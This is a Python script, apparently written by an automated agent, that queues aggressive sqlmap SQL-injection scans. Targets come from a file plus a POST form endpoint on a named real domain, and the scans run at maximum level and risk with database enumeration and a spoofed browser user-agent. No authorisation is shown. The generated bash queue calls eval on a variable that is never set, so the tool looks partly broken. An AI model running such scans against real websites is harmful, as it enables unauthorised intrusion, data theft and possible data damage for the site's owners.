#!/usr/bin/env python3
"""Step 1: keep the ONLY sqlmap flock in the box. sqlmap's sessions.sqlite locks the
whole tool; previous workers left concurrent runs, so new sqlmap invocations block
forever. Fix: one writer at a time, launched from a queue with nohup/setsid."""
import subprocess, os, time, sys

O = '/work/tool_outputs'
os.makedirs(O + '/sqout', exist_ok=True)
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
COMMON = ['--batch', '--level=5', '--risk=3', '--dbs', '--threads=1', '--flush-session',
          '-H', 'User-Agent: ' + UA, '-H', 'Accept: */*',
          '-H', 'Accept-Encoding: identity',      # kills Brotli truncation -> stable page
          '-H', 'Connection: close', '--timeout=20', '--retries=1',
          '--output-dir=' + O + '/sqout']

targets = []
for line in open(O + '/sqli_targets.txt'):
    n, u = line.strip().split('\t')
    targets.append(('get_' + n, ['-u', u]))
targets.append(('post_send', ['-u', 'https://www.infinitycapital.bh/api/send', '--method=POST',
    '--data=fname=Sqlmap&lname=Probe&areacode=973&tel=5551234&cname=QA+Tester&subject=Hello&msg=Body+text&check=on&targets=probe%40example.com']))

def alive():
    out = subprocess.run(['pgrep', '-af', 'sqlmap -u'], capture_output=True, text=True).stdout
    return [l for l in out.splitlines() if 'defunct' not in l and 'queue.py' not in l]

script = ['#!/bin/bash', 'O=/work/tool_outputs',
          'while read -r name; do', '  [ -z "$name" ] && continue',
          '  echo "START $name $(date +%T)" >> $O/sq_progress.txt',
          '  eval "$SQLARGS --output-dir=$O/sqout/$name" > $O/sq_$name.log 2>&1',
          '  echo "DONE  $name $(date +%T)" >> $O/sq_progress.txt', 'done']
open('/work/sqlqueue.sh', 'w').write('\n'.join(script) + '\n')

names = []
for n, args in targets:
    open(O + '/sqout/' + n + '.args', 'w').write(' '.join(args))
    names.append(n)
open('/work/sqlqueue_list.txt', 'w').write('\n'.join(names) + '\n')
print('queued', names)
